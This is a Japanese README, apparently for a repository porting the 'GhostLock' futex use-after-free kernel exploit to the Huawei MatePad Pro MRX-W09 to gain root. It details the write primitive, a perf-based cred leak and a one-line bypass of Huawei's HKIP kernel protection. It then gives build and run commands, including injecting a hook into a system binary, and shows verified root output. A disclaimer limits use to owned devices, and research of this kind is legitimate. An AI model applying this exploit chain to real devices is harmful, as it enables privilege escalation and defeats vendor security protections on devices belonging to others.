# GhostLock on MRX-W09 — Huawei MatePad Pro (Kirin 990 / EMUI 11 / Linux 4.14.116) 向け root chain

**CVE-2026-43499（"GhostLock"）** の特定端末への移植と **エンドゲーム（root 取得）** の実機検証記録です。

> **状態: root 取得成功・実機検証済み。**
> `rsh -c id` → `uid=0(root) gid=0(root) … context=u:r:shell:s0`、
> root 所有の `/data/local/tmp/rooted.txt` と 4755 root 所有の `/data/local/tmp/rsh` を生成。
> 対象は **Huawei MRX-W09**（MatePad Pro 10.8, 2019）／**EMUI 11（Android 10 ベース）**／
> **Linux 4.14.116（Kirin 990, arm64, LTO/CFI, Huawei HKIP 有効）**。

English version: [README.en.md](README.en.md)

---

## TL;DR

```text
$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ls -ln /data/local/tmp/
-rw-r--r-- 1 0 2000      67 rooted.txt
-rwsr-xr-x 1 0 2000 4094384 rsh
```

本リポジトリの価値は**メモリ破壊バグ本体ではありません**（CVE-2026-43499 は公開済みで PoC も複数存在）。
価値は**この端末固有のエンドゲーム**です:

1. この LTO/CFI カーネルで**実際に動く perf ベースの cred リーク**、
2. write primitive の**格納先セマンティクスを逆アセンブルで証明**、
3. **Huawei HKIP をカーネルソースから解明**し、**1行の条件（`task_pid_nr(task) == 0`）で無効化**。

---

## 1. 対象

| | |
|---|---|
| 端末 | Huawei **MRX-W09**（MatePad Pro 10.8", 2019） |
| SoC | HiSilicon **Kirin 990**（arm64） |
| カーネル | **Linux 4.14.116**、LTO/CFI、KASLR |
| OS | **EMUI 11**（Android 10） |
| SELinux | Enforcing（`shell` に capability allow 無し） |
| 追加防衛 | **HKIP**（Huawei Kernel Integrity Protection）/ HHEE / HISEe |

ブートローダは**ロック済み**で Kirin 990 の公開 unlock は存在しません（§8）。よってこの端末では
**カーネルエクスプロイトが唯一の root 経路**です。

---

## 2. 脆弱性（CVE-2026-43499 "GhostLock"）

futex PI 経路（`rt_mutex_adjust_prio_chain`）の use-after-free。`FUTEX_CMP_REQUEUE_PI` /
`pselect6` / IPv4 `MCAST_BLOCK_SOURCE` 経由でカーネルスタック上の stale `rt_mutex_waiter` を
`copy_from_user` で整形（"stamp"）し、`rb_erase_cached()` に消させる。この消去が我々の制御する
ストアを行う:

```
str x9,  [x8, #8]      ; *((p0 & ~3) + 8) = p1      (leaf: p1==0 のとき 8バイトの 0)
str x10, [x9]          ; *(p1) = p0                 (p1 != 0 のときのみ)
```

したがって write primitive は:

| 形状 | 呼び方 | 効果 |
|---|---|---|
| **leaf** | `wi(addr - 8, 0, 0)` | `*(addr) = 0`（8バイト） |
| **pointer** | `wi(value, target, 0\|1)` | `*(target) = value` |

leaf の格納先は**端末自身の `vmlinux.elf` の `rb_erase_cached.cfi` 逆アセンブルで証明**しています
（`docs/static-analysis/TASK_WRITE_SHAPE_20260926.md`）。よく引用される
`rb_erase_cached.cfi+0x88` は `p[2] != 0` 側の分岐で、本ペイロードでは**到達しません**。

---

## 3. エンドゲームの流れ

```
        ┌── (host) enabler を /system/bin/bugreportz に注入して実行
        │         -> perf_event_paranoid = -1
        ▼
  MAIN ── fork ──> CHILD
                     │
                     │ 1. 自分の cred C と task_struct X を perf でリーク
                     │      (SyS_setpriority.cfi をサンプルし x25 = current->cred を読む)
                     │
   MAIN ─────────────┤ 2. leaf-zero  X + 0x820        <- HKIP pid-0 シールド
                     │ 3. leaf-zero  C + 0x04        <- uid+gid = 0
                     │
                     │ 4. setresuid(0,0,0) -> 非 capability フォールバックが成立
                     │      -> commit_creds() -> uid 0 / fsuid 0
                     │
                     │ 5. uid 0 + shell ドメインで proof を書き、root コマンドを提供
                     ▼
             /data/local/tmp/rooted.txt   (uid 0 が作成)
             /data/local/tmp/rsh          (4755, root 所有)
             rsh -c id                    -> uid=0(root)
```

### 3.1 cred リーク — `SyS_setpriority.cfi` 内の `x25`

`SyS_setpriority` は `current->cred` を1回だけ実体化し、callee-saved レジスタに保持します:

```asm
ffffff800818e354 <SyS_setpriority.cfi>:
+0x34  mrs  x19, sp_el0            ; x19 = current
+0x38  ldr  w8,  [x19,#1728]
+0x3c  ldr  x25, [x19,#2536]       ; x25 = current->cred   (2536 = 0x9E8)
+0x1f8  adrp x25, …                ; ここで x25 再利用
```

よって `ip ∈ [SyS_setpriority.cfi+0x3c, +0x1f8)`（0x1BC バイト）のサンプルは
`regs[25] == current->cred`。300,000 回の `setpriority(0,0,-20)` ストームを回し、窓内の
最後の `x25` を返します（perf のレジスタ順はカーネルツリーで確認: index 25 = `PERF_REG_ARM64_X25`）。

以前の試みが失敗した理由: `security_capable.cfi` の `x0` は**入口命令のみ** cred、
`cap_capable` は `x20` 保持、全レジスタ投票は `current` が支配する。

### 3.2 HKIP の無効化（決定的な発見）

Huawei HKIP は pid ごとの「root 許可ビット」を持ち、ビット未設定で root 状のタスクを**殺します**。
端末カーネルソース（`drivers/hisi/hhee/hkip/critdata.c`, `include/linux/hisi/hisi_hkip.h`）より:

```c
static bool hkip_compute_uid_root(const struct cred *c)
{
    return uid_eq(c->uid,0) || uid_eq(c->euid,0) || uid_eq(c->suid,0) ||
           !cap_isclear(c->cap_inheritable) || !cap_isclear(c->cap_permitted);
}
int hkip_check_uid_root(void)
{
    if (hkip_get_current_bit(hkip_uid_root_bits, /* def_value = */ true))
        return 0;                       /* <-- 免除 */
    if (unlikely(hkip_compute_uid_root(creds) || uid_eq(creds->fsuid, 0))) {
        pr_alert("UID root escalation!\n");
        force_sig(SIGKILL, current);    /* <-- 殺し屋 */
        return -EPERM;
    }
    return 0;
}
static inline bool hkip_get_task_bit(const u8 *bits, struct task_struct *t, bool def_value)
{
    pid_t pid = task_pid_nr(t);
    if (pid != 0) return hkip_get_bit(bits, pid, PID_MAX_DEFAULT);
    return def_value;                   /* <-- pid 0 は免除 */
}
```

* チェックは `__cap_capable` / `prepare_creds` / `copy_process` / `acl_permission_check` から呼ばれる。
* ビットは `commit_creds`（`hkip_update_xid_root`）と `fork`（`hkip_init_task`）だけが設定できる
  （ビットマップは HVC 保護領域）。
* **`task_pid_nr(task) == 0` ⇒ `def_value == true` ⇒ そのタスクの HKIP チェックは常に 0。**

⇒ root 化の**前に** `task_struct.pid`（オフセット `0x820`）をゼロにすれば、**1タスクが完全に
HKIP 免除**になります（"pid-0 シールド"）。pid-0 のタスクは **exit 禁止**
（`kernel/exit.c:786` が *"Attempted to kill the idle task!"* で panic）なので永久に待機させます。
そこからの `fork()` は合法で、子は実 pid と root cred から算出された HKIP ビットを得ます。

### 3.3 非 capability フォールバックによる root

このポリシーでは `shell` に capability がありません（`adbd` には有るが `shell` には無い）。
よって `ns_capable(CAP_SETUID)` 経路は全滅。唯一の道は `setresuid(0,0,0)` の
**非 capability フォールバック**:

```c
if (!ns_capable(old->user_ns, CAP_SETUID)) {
    if (ruid != -1 && !uid_eq(kruid, old->uid) && !uid_eq(kruid, old->euid) &&
                      !uid_eq(kruid, old->suid)) goto error;
    …
}
```

したがって `old->uid == 0` にすれば十分（leaf store で `cred+0x04`）。`commit_creds()` が
`uid 0` と `fsuid = euid = 0`（＝生成ファイルが root 所有）を与え、HKIP はシールドにより通ります。

### 3.4 `nosuid` な `/data` 上での root シェル

`/data` は `nosuid` マウントのため、そこに置いた 4755 バイナリでは root になれません。
代わりに**シールドされた uid-0 タスクが abstract unix socket（`\0gl_su`）で root コマンドを提供**し、
`rsh` は同じバイナリのクライアントモードで `-c CMD` を転送します。リクエストごとに fork した
孫は `copy_process → hkip_init_task()` が root cred からビットを書くため**合法な root**です。

---

## 4. 構成

```
exploit/ghostlock_mrx_e.c   エクスプロイト本体（単一ファイル。診断モード多数、endgame は --simple）
exploit/offset_mrx.h        このビルド用の構造体/シンボルオフセット
enabler/inject_hook.c       host 側 enabler（/system/bin/bugreportz へ注入）
docs/FACTS.md               端末ごとの研究ログ（facts 9an(1)…(133)）
docs/HKIP_DECODED_20260922.md
docs/SYMBOLS_20260926.md    端末自身の vmlinux.elf から取得した ground-truth シンボル
docs/static-analysis/       逆アセンブル/ポリシー解析レポート5本
docs/PUBLICATION_REVIEW_ja.md  公開可否のための裏取り（法令・ポリシー・開示状況）
```

---

## 5. ビルド

```sh
aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e ghostlock_mrx_e.c
```

（本検証は NDK r20b を使用）

## 6. 実行

```sh
adb push ghostlock_e /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_e

# 1) enabler を設置・注入し、トリガする
adb shell /data/local/tmp/inject_hook place 0x84000 0x244 0x7a3d8
adb shell /data/local/tmp/inject_hook hook  0x7a3d4 0x84000
adb shell nohup /system/bin/bugreportz >/dev/null 2>&1 &
adb shell /data/local/tmp/inject_hook restore 0x7a3d4 0xd10403ff
adb shell cat /proc/sys/kernel/perf_event_paranoid      # -1 になること

# 2) エンドゲームを実行
adb shell nohup /data/local/tmp/ghostlock_e --simple >/dev/null 2>&1 &

# 3) 検証
adb shell ls -ln /data/local/tmp/rooted.txt /data/local/tmp/rsh
adb shell /data/local/tmp/rsh -c id
```

---

## 7. 実機での検証結果

```
=== /data/local/tmp/rooted.txt ===
=== GHOSTLOCK MRX-W09 rooted ===
uid=0 euid=0 context=u:r:shell:s0

$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ps -A -o PID,UID,NAME | grep ghostlock
 4441     0 ghostlock_e        # シールドされた uid-0 タスク
 4212  2000 ghostlock_e        # 起動側
```

## 8. この root が **できない** こと

* bounding set は `0xc0`、`setresuid` 後の cred は **capability ゼロ**、ドメインは
  `u:r:shell:s0` のまま。**「shell ドメイン内での DAC root」**であり、`mount`・`insmod`・
  `/dev/block`・`/system` 書き込みは**できません**。
* **1ブート限り**（毎回起動時に再実行）。ブートローダは**ロック済み**で Kirin 990 の公開 unlock は
  存在しません（PotatoNV は Kirin 960 まで、BootROM の CVE は USB Download Mode を殺す eFuse で
  対策済み、テストポイント＋基板ソフト法は Kirin 990 **5G** 限定かつ MatePad Pro 2019 の基板ソフトは
  非公開）。カーネルエクスプロイトからブートローダへは到達できません（検証鍵と unlock 状態は
  ROM/eFuse/TEE に存在）。
* さらなる特権化（full caps + `mount`）は進行中: `--cede`（pid-0 シールド下で
  `task->cred = &init_cred`）で `CAP_FULL_SET` とカーネル SELinux ドメインは得られますが、
  カーネルドメインはユーザのファイル I/O を拒否するため、**改変ポリシーを cede 済みタスクから
  ロードする**計画です（`docs/FACTS.md` 9an(133) 以降）。

## 9. 謝辞

* GhostLock 本体と PoC 群の原著者（`ghostlock_pocs/` に列挙）。
* 「cred を実体化する関数のレジスタをサンプルする」着想: **aquos-r6** PoC 系。
* `docs/` の内容はすべて**この端末自身の `vmlinux.elf` とカーネルツリー**から導出しています。
* HKIP のコード引用は GPLv2 カーネルソース由来（[NOTICE](NOTICE) 参照）。

## 10. 免責

著者が**所有する端末**でのセキュリティ研究・相互運用・修理を目的としたものです。
CVE-2026-43499 は公開済みで PoC も既に複数存在します。**他人が所有する端末に対して使用しないで
ください。** 無保証・現状のまま提供します。公開可否の検討は
[docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) を参照。
